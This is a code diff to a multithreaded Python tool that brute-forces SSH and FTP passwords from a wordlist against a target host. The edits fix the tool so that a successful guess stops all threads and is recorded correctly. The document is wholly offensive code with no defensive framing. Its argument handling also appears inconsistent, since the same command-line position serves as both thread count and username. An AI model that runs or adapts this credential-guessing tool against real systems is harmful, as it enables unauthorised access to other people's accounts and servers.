@@ -1,7 +1,9 @@
 import ftplib
+import os
 import paramiko
 import threading, queue, sys, socket
 from time import sleep
+
 
 threads = sys.argv[2]
 guessed = False
@@ -14,16 +16,16 @@ def ssh_guesser(hostname, username):
     while not guessed and not q.empty():
         password = q.get()
         print(f"Guessing password: {password}")
-        guessed = True
-        correct_password = password
 
         try:
             sshclient.connect(hostname=hostname, username=username, password=password, timeout=2)
             print(f"[+] Correct combination found \nusername:{username}\npassword:{password} ")
+            guessed = True
+            correct_password = password
 
         except socket.timeout:
             print("[+] Host is unreachable. Existing...")
-            exit(0)
+            os._exit(0)
         except paramiko.SSHException:
             print("[+] Quota excedding Retrying after 2 sec")
             sleep(2)
@@ -55,7 +57,7 @@ username = sys.argv[2]
 type = sys.argv[3]
 
 if type == "ssh":
-    with open("passwordlist.txt", "r") as file:
+    with open("password.txt", "r") as file:
         for password in file.read().splitlines():
             q.put(password)
 
@@ -64,7 +66,7 @@ if type == "ssh":
         t.start()
 
 if type == "ftp":
-    with open("passwordlist.txt", "r") as file:
+    with open("password.txt", "r") as file:
         for password in file.read().splitlines():
             q.put(password)
 
